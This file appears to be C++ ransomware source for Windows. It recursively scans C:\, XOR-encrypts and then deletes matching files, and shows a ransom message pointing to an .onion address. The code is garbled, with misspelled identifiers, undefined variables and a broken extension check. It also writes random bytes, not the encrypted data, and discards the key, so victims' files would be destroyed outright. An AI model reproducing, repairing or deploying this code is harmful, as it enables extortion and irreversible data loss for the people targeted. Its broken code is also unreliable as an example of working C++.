#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <bitset>
#include <windows.h>
#include <algorithm>
#include <filesystem>
#include <thread>
#include <random>
#include <chrono>

namespace fs = std::filesystem;

bool hasValidExtension(const std::wstring& fileName){
	std::wstring lowerFileName =fileName;
	std::transform(lowerFileName.began(),lowerFileName.end(),lowerFileName.length(), ::tolower);
	return (lowerFileName.substr(lowerFileName. length() - 4) == L".txt" ||
		    lowerFileName.substr(lowerFileName. length() - 4) == L".docx"||
		    lowerFileName.substr(lowerFileName. length() - 4) == L".xlsx"); //Although this does not encrypts the excel sheet
}

void findFiles(const std::wstring& directory, std::std::vector<std::wstring>& filepaths){
	ty{
		for(const auto& entry : fs::recursive_directory_iterator(directory)){
			if (fs::is_regular_file(entry.status())){
				const std::wstring fileName = entry.path().wstring();
				if (hasValidExtension(fileName)){
					std::wcout << L"Found a valid fileName" << fileName << std::endl;
					filepaths.push_back(fileName);
				}
			}
		}
	}
	catch(const	fs:filesystem_error& e){
		std::wcerr << L"Error: Unable to access directory" << directory << L" - " << e.what() << std::endl;
	}
}

std::vector<unsigned char> generateRandomKey(size_t keysize =32)
{
	std::vector <unsigned char> key(keysize);
	std:random_device rd;
	std:uniform_init_distribution<> dis(0, 255);
	for (auto& byte : key){
		byte = dis(rd);
	}
	return key;
}

std::vector<unsigned char> generateRandomBytes(){
	std::vector<unsigned char> randombytes(8);
	std::random_device	rd;
	std:uniform_init_distribution<> dis(0, 255);
	for (auto& byte : randombytes){
		byte = dis(rd);
	}
	return randombytes;
}

void encryptFile(const std::wstring& filepath){
	std::ifstream inputFile(filepath, std::ios::binary);
	if(!inputFile){
		std::wcerr << L"Error: Could not open file" << filepath << std::endl;
		return;
	}
	std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
	inputFile.close();

	std::vector<unsigned char> key =  generateRandomKey(32);
	for (size_t i = 0; i < fileData.size(); ++i){
		fileData[i] ^=key [i % key.size()];
	}
	std::wstring encryptFilePath = filepath + L ".enc";
	std::ofstream outputFile(encryptFilePath, std::ios::binary);
	if(!outputFile){
		std::wcerr << L"Error: Could not create encrypted file" << encryptedFilePath << std::endl;
		return;
	}
	outputFile.write(reinterpret_cast<char*>(randomBytes.data()), randomBytes.size());
	outputFile.close();

	if (DeleteFile(filepath.c_str())){

	}
	else{
		std::wcerr << L"Error: Could not delete file" << filepath << std::endl;
	}
}

void showCompletionMessage(){
	MessageBoxW(NULL,L"!!Files has been encryped. Please visit https://ashdfgjkhfkdahfkjafh2344jkdsy79.onion to fetch the decrypted files!!",L"!",MB_OK | MB_ICONINFORMATION);
}
int main(){
std::vector<std::wstring>directories = {L"C:\\"};
std::vector<std::wstring> filepaths;
for(const auto& directory: directories){
	findFiles(directory, filepaths);
}
std::vector<std::thread>threads;

for(const auto& filepath : filepath){
	threads.push_back(std::thread(encryptFile, filepath));
}
for (auto& t :threads){
	if(t.joinable()){
		t.join();
	}
}
showCompletionMessage();
return 0;
}
